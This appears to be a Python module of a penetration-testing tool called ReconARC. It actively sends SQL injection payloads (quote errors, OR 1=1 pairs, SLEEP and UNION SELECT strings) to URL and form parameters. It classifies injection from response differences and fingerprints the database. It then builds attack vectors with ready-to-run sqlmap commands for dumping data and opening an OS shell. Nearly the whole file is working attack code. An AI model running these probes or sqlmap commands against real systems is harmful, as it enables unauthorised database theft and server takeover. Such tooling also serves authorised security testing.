"""
ReconARC — Active SQL Injection Detection
==========================================
Sends actual SQLi payloads to parameters and compares responses against a
clean baseline to confirm injection (the existing ``check_sqli_point`` in
``web_enum`` only *identifies* candidate parameters — it never tests them).

This module replicates the manual confirmation workflow:

    Baseline:   POST /search  search=test       → HTTP 200, 4 823 bytes
    Payload:    POST /search  search=admin'     → HTTP 500,    12 bytes   ← CONFIRMED

Detected injection classes:
    error-based   — HTTP 500 / SQL error string in body
    boolean-based — response size differs > SIZE_THRESHOLD bytes between
                    ``OR 1=1`` (true) and ``OR 1=2`` (false)
    union-based   — ``UNION SELECT`` columns reflected or column-count match
    time-based    — response delayed > TIME_THRESHOLD seconds on SLEEP payload
    blind         — payload changes behaviour but no explicit error/data

Safety:
    - Every request uses ``timeout=5`` via ``utils.http_get``/``http_post``
      (which already swallow exceptions and return ``None``).
    - Connection errors degrade gracefully: a failed payload is recorded as
      evidence but never crashes the probe.

Usage::

    from tools.sqli_probe import (
        probe_param, probe_form, probe_url_params,
        classify_injection, generate_sqli_vector, SQLI_PAYLOADS,
    )
"""

import re
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from utils import http_get, http_post, run_command
from state import AttackVector


# ── Configuration ─────────────────────────────────────────────────────

REQUEST_TIMEOUT = 5          # seconds per HTTP request
TIME_THRESHOLD  = 3.0        # delay (s) that indicates time-based SQLi
SIZE_THRESHOLD  = 200        # byte-diff that indicates boolean SQLi
ERROR_PATTERNS = [
    r"sql\s*syntax",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"oracle\s*error",
    r"microsoft\s*sql\s*server",
    r"odbc\s*sql\s*server",
    r"postgresql.*error",
    r"warning.*\bsqlite_",
    r"sqlite3\.operationalerror",
    r"pg_query\(",
    r"unterminated\s*string",
    r"you\s*have\s*an\s*error\s*in\s*your\s*sql\s*syntax",
    r"syntax\s*error\s*(?:at|near)",
    r"unclosed\s*quotation\s*mark",
    r"mysqli?_[a-z]+",
    r"valid\s*mysql\s*result",
    r"oracle\.dataaccess",
    r"system\.data\.oledb",
    r"microsoft\s*ole\s*db\s*provider",
    r"incorrect\s*syntax\s*near",
]


# ── Payloads ──────────────────────────────────────────────────────────
# Each payload is tagged with the injection class it primarily probes.

SQLI_PAYLOADS: List[Dict] = [
    {"payload": "'",                          "type": "error"},
    {"payload": "\\",                         "type": "error"},
    {"payload": '"',                          "type": "error"},
    {"payload": ";",                          "type": "error"},
    {"payload": "--",                         "type": "error"},
    {"payload": "' OR '1'='1",                "type": "boolean_true"},
    {"payload": "' OR '1'='2",                "type": "boolean_false"},
    {"payload": "1' AND SLEEP(5)-- -",        "type": "time"},
    {"payload": "1 AND SLEEP(5)-- -",         "type": "time"},
    {"payload": "' UNION SELECT NULL-- -",                     "type": "union"},
    {"payload": "' UNION SELECT NULL,NULL-- -",               "type": "union"},
    {"payload": "' UNION SELECT NULL,NULL,NULL-- -",          "type": "union"},
]


# ── Helpers ───────────────────────────────────────────────────────────

def _measure(resp) -> Dict:
    """Normalise a requests response (or ``None``) into a comparable dict."""
    if resp is None:
        return {"status": 0, "size": 0, "time": 0.0, "text": "", "ok": False}
    return {
        "status": resp.status_code,
        "size":   len(resp.text),
        "time":   resp.elapsed.total_seconds(),
        "text":   resp.text,
        "ok":     True,
    }


def _send_request(
    url: str, method: str, params: Dict, headers: Optional[Dict] = None,
) -> Optional[Dict]:
    """Send a single request, timing it, and return a measurement dict."""
    start = time.time()
    if method.upper() == "GET":
        resp = http_get(
            url, timeout=REQUEST_TIMEOUT, verify_ssl=False,
            headers=headers,
        )
    else:
        resp = http_post(
            url, data=params, timeout=REQUEST_TIMEOUT, verify_ssl=False,
            headers=headers,
        )
    elapsed = time.time() - start
    result = _measure(resp)
    # Prefer wall-clock measurement for time-based detection.
    result["time"] = max(result["time"], elapsed)
    return result


def _has_error(text: str) -> Optional[str]:
    """Return the matched error string if the body contains a SQL error."""
    lower = (text or "").lower()
    for pattern in ERROR_PATTERNS:
        if re.search(pattern, lower):
            return pattern
    return None


_DB_PATTERNS = [
    ("mysql",      [r"mysql", r"mysqli?", r"sql syntax.*mysql"]),
    ("postgresql", [r"postgresql", r"pg_query", r"psql"]),
    ("mssql",      [r"microsoft sql server", r"sql server", r"odbc sql server"]),
    ("oracle",     [r"oracle", r"ora-\d{5}"]),
    ("sqlite",     [r"sqlite", r"sqlite3"]),
]


def _fingerprint_db_from_text(text: str) -> Optional[str]:
    """Identify database type from error message text."""
    lower = (text or "").lower()
    for db_name, patterns in _DB_PATTERNS:
        for pat in patterns:
            if re.search(pat, lower):
                return db_name
    return None


# ── (1) probe_param ───────────────────────────────────────────────────

def probe_param(
    url: str,
    method: str,
    param_name: str,
    param_value: str = "test",
    extra_params: Optional[Dict] = None,
) -> Dict:
    """Actively probe a single parameter for SQL injection.

    Sends a baseline request, then each payload in ``SQLI_PAYLOADS`` with the
    target parameter replaced by the payload.  Compares status code, response
    size, and response time against baseline.

    Args:
        url:         Target URL (without query string for GET, or with path
                     for POST).
        method:      ``"GET"`` or ``"POST"``.
        param_name:  Parameter name to inject into.
        param_value: Clean baseline value (default ``"test"``).
        extra_params: Additional parameters to include in every request
                      (preserved as-is, e.g. ``{"submit": "Search"}``).

    Returns:
        ``{
            "is_vulnerable": bool,
            "injection_type": str,   # error | boolean | union | time | blind | none
            "evidence": [str, ...],
            "payloads_used": [str, ...],
            "parameter": str,
            "url": str,
            "method": str,
        }``
    """
    extra_params = extra_params or {}
    method = method.upper()
    result: Dict = {
        "is_vulnerable":  False,
        "injection_type": "none",
        "evidence":       [],
        "payloads_used":  [],
        "parameter":      param_name,
        "url":            url,
        "method":         method,
    }

    # ── baseline request ──
    base_params = {**extra_params, param_name: param_value}
    baseline = _send_request(url, method, base_params)
    if not baseline["ok"]:
        result["evidence"].append(
            "Baseline request failed — cannot determine vulnerability"
        )
        return result

    result["evidence"].append(
        f"Baseline: status={baseline['status']} "
        f"size={baseline['size']} time={baseline['time']:.2f}s "
        f"value={param_value!r}"
    )

    # Capture DB type from baseline error messages (some apps leak errors)
    base_db = _fingerprint_db_from_text(baseline.get("text", ""))
    if base_db:
        result["evidence"].append(
            f"DB fingerprint from baseline: {base_db}"
        )

    # Track boolean pair separately for size comparison.
    bool_true:  Optional[Dict] = None
    bool_false: Optional[Dict] = None

    for entry in SQLI_PAYLOADS:
        payload = entry["payload"]
        ptype   = entry["type"]

        # Build request with payload substituted into the target param.
        probe_params = {**extra_params, param_name: payload}
        measurement = _send_request(url, method, probe_params)

        # Store boolean pair responses for cross-comparison after the loop.
        if ptype == "boolean_true":
            bool_true = measurement
        elif ptype == "boolean_false":
            bool_false = measurement

        if not measurement["ok"]:
            result["evidence"].append(
                f"Payload {payload!r} ({ptype}): request failed/timeout"
            )
            continue

        inj_type = classify_injection(baseline, measurement, payload)

        result["evidence"].append(
            f"Payload {payload!r} ({ptype}): status={measurement['status']} "
            f"size={measurement['size']} time={measurement['time']:.2f}s "
            f"→ classified={inj_type}"
        )

        if inj_type != "blind" and inj_type != "none":
            result["is_vulnerable"] = True
            result["payloads_used"].append(payload)
            # Promote injection_type to the most specific confirmed class.
            if result["injection_type"] == "none":
                result["injection_type"] = inj_type
            elif inj_type == "error":
                result["injection_type"] = "error"  # error is most definitive

            # Capture DB type from error response
            if inj_type == "error":
                db_guess = _fingerprint_db_from_text(measurement.get("text", ""))
                if db_guess:
                    result["evidence"].append(
                        f"DB FINGERPRINT: {db_guess} (from error response)"
                    )
                    result["db_type"] = db_guess

    # ── boolean cross-check: compare true vs false payloads ──
    if bool_true and bool_false and bool_true["ok"] and bool_false["ok"]:
        size_diff = abs(bool_true["size"] - bool_false["size"])
        if size_diff > SIZE_THRESHOLD:
            result["is_vulnerable"] = True
            if result["injection_type"] == "none":
                result["injection_type"] = "boolean"
            result["payloads_used"].append("' OR '1'='1 / ' OR '1'='2")
            result["evidence"].append(
                f"Boolean confirmed: true-size={bool_true['size']} "
                f"false-size={bool_false['size']} diff={size_diff}b"
            )

    # ── union cross-check: look for reflected NULL placeholders ──
    # A reflected UNION SELECT may show the literal NULLs or numeric
    # column data where the app normally shows content.
    union_payloads = [p["payload"] for p in SQLI_PAYLOADS if p["type"] == "union"]
    for payload in union_payloads:
        probe_params = {**extra_params, param_name: payload}
        measurement = _send_request(url, method, probe_params)
        if measurement["ok"] and "UNION SELECT" in measurement["text"].upper():
            # The app reflected the query — strong UNION signal
            result["is_vulnerable"] = True
            if result["injection_type"] == "none":
                result["injection_type"] = "union"
            result["payloads_used"].append(payload)
            result["evidence"].append(
                f"Union confirmed: UNION SELECT reflected in response "
                f"({measurement['size']}b)"
            )

    return result


# ── (2) probe_form ────────────────────────────────────────────────────

def probe_form(url: str, form_dict: Dict) -> List[Dict]:
    """Probe every field in an HTML form for SQL injection.

    Args:
        url:       Base URL or page URL the form was found on.
        form_dict: ``{"action": str, "method": str, "fields": [str, ...]}``
                   as produced by ``web_enum.discover_forms``.

    Returns:
        List of vulnerability dicts (one per vulnerable field) in the same
        shape as :func:`probe_param`.
    """
    action = form_dict.get("action") or url
    method = (form_dict.get("method") or "GET").upper()
    fields = form_dict.get("fields") or []

    target_url = urljoin(url, action) if not action.startswith("http") else action

    vulns: List[Dict] = []
    # Extract known select option values from raw_fields if available
    raw_fields = form_dict.get("raw_fields", [])
    field_defaults = {}
    for rf in raw_fields:
        fname = rf.get("name", "")
        ftype = rf.get("type", "")
        if "select" in ftype.lower() or "textarea" in ftype.lower():
            # Try the first option value if provided
            options = rf.get("options", [])
            if options:
                first_val = options[0].get("value", "") if isinstance(options[0], dict) else str(options[0])
                if first_val:
                    field_defaults[fname] = first_val
    
    for field in fields:
        # Inject into one field at a time; keep other fields at reasonable defaults.
        extra = {}
        for f in fields:
            if f != field:
                # Use known select option, or common defaults
                if f in field_defaults:
                    extra[f] = field_defaults[f]
                elif f.lower() in ("type", "category", "filter"):
                    extra[f] = "username"  # Common select default
                else:
                    extra[f] = "test"
        result = probe_param(
            url=target_url,
            method=method,
            param_name=field,
            param_value="test",
            extra_params=extra,
        )
        if result["is_vulnerable"]:
            vulns.append(result)
    return vulns


# ── (3) probe_url_params ──────────────────────────────────────────────

def probe_url_params(url: str) -> List[Dict]:
    """Probe every query-string parameter in *url* for SQL injection.

    Args:
        url: Full URL including query string, e.g.
             ``http://host/page.php?id=1&name=foo``.

    Returns:
        List of vulnerability dicts for any parameter confirmed injectable.
    """
    parsed = urlparse(url)
    if not parsed.query:
        return []

    query_params = parse_qs(parsed.query, keep_blank_values=True)
    # Flatten parse_qs lists → first value per key.
    flat_params = {k: (v[0] if v else "") for k, v in query_params.items()}

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    vulns: List[Dict] = []
    for param, value in flat_params.items():
        extra = {k: v for k, v in flat_params.items() if k != param}
        result = probe_param(
            url=base_url,
            method="GET",
            param_name=param,
            param_value=value,
            extra_params=extra,
        )
        if result["is_vulnerable"]:
            vulns.append(result)
    return vulns


# ── (4) classify_injection ────────────────────────────────────────────

def classify_injection(baseline: Dict, response: Dict, payload: str) -> str:
    """Determine the injection class from a baseline/response diff.

    Args:
        baseline:  Measurement dict from the clean request.
        response:  Measurement dict from the payload request.
        payload:   The SQLi payload string that was sent.

    Returns:
        One of: ``"error"``, ``"time"``, ``"union"``, ``"boolean"``,
        ``"blind"``, or ``"none"``.
    """
    # Time-based: response significantly slower than baseline.
    if (response["time"] - baseline["time"]) > TIME_THRESHOLD:
        return "time"

    # Error-based: HTTP 500 or DB error string in body.
    if response["status"] >= 500 and baseline["status"] < 500:
        return "error"
    if baseline["status"] < 500:
        err = _has_error(response["text"])
        if err and not _has_error(baseline["text"]):
            return "error"

    # UNION-based: payload text reflected or columns/UNION keyword in body.
    if "UNION SELECT" in payload.upper():
        upper_text = response["text"].upper()
        if "UNION SELECT" in upper_text or "NULL,NULL" in upper_text:
            return "union"
        # UNION that succeeds often returns a *different* row count → size diff
        if abs(response["size"] - baseline["size"]) > SIZE_THRESHOLD:
            return "union"

    # Boolean-based: significant size difference from baseline.
    if abs(response["size"] - baseline["size"]) > SIZE_THRESHOLD:
        return "boolean"

    # Status-code change that isn't an error.
    if response["status"] != baseline["status"]:
        return "blind"

    # No observable difference.
    return "none"


# ── (5) generate_sqli_vector ──────────────────────────────────────────

def generate_sqli_vector(
    url: str, param: str, injection_info: Dict,
) -> AttackVector:
    """Build an :class:`AttackVector` from a confirmed SQLi finding.

    The vector includes ready-to-run ``sqlmap`` commands and manual payload
    suggestions so an operator can follow up without re-discovery.

    Args:
        url:            Target URL (path only, no query string).
        param:          Confirmed injectable parameter name.
        injection_info: Result dict from :func:`probe_param`.

    Returns:
        Populated ``AttackVector`` TypedDict.
    """
    inj_type   = injection_info.get("injection_type", "unknown")
    evidence   = injection_info.get("evidence", [])
    payloads   = injection_info.get("payloads_used", [])
    method     = injection_info.get("method", "GET")
    confidence = "high" if payloads else "medium"

    # Build sqlmap command.
    sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2"
    if method.upper() == "POST":
        sqlmap_cmd += f" --data='{param}=test' -p {param}"
    else:
        sqlmap_cmd += f" -p {param}"
    if inj_type == "time":
        sqlmap_cmd += " --technique=T"
    elif inj_type == "boolean":
        sqlmap_cmd += " --technique=B"
    elif inj_type == "error":
        sqlmap_cmd += " --technique=E"
    elif inj_type == "union":
        sqlmap_cmd += " --technique=U"
    sqlmap_cmd += " --dbs"

    # Manual payload suggestions.
    manual_payloads = [
        f"' OR '1'='1",
        f"' UNION SELECT NULL,NULL,NULL-- -",
        f"' AND SLEEP(5)-- -",
        f"{param}=admin'-- -",
    ]
    if payloads:
        # Surface the confirmed payloads first.
        manual_payloads = list(dict.fromkeys(payloads + manual_payloads))

    exploit_suggestions = [
        sqlmap_cmd,
        f"sqlmap -u '{url}' -p {param} --dump --batch",
        f"sqlmap -u '{url}' -p {param} --os-shell --batch",
        f"Manual payloads for {param}: {', '.join(manual_payloads[:5])}",
    ]

    type_desc = {
        "error":   "error-based SQLi (DB errors exposed)",
        "boolean": "boolean-based blind SQLi",
        "union":   "UNION-based SQLi (data extraction via UNION SELECT)",
        "time":    "time-based blind SQLi (SLEEP/WAITFOR)",
        "blind":   "blind SQLi (behavioural difference)",
    }.get(inj_type, "SQL injection")

    vector_id = f"sqli_{param}_{hash(url) % 100000}"

    return AttackVector(
        id=vector_id,
        target=url,
        category="initial_access",
        vector_type="sqli",
        title=f"SQL Injection in parameter '{param}' ({type_desc})",
        description=(
            f"Active probing confirmed {type_desc} in parameter '{param}' "
            f"at {url} ({method}). {len(payloads)} payload(s) triggered a "
            f"detectable response difference."
        ),
        confidence=confidence,
        score=95 if inj_type in ("error", "union", "boolean") else 80,
        evidence=evidence[:20],
        exploit_suggestions=exploit_suggestions,
        prerequisites=[
            "Network access to the target web application",
            "Target parameter must accept user input",
            "sqlmap installed for automated exploitation",
        ],
        cves=[],
        references=[
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection",
            "https://github.com/sqlmapproject/sqlmap",
        ],
    )
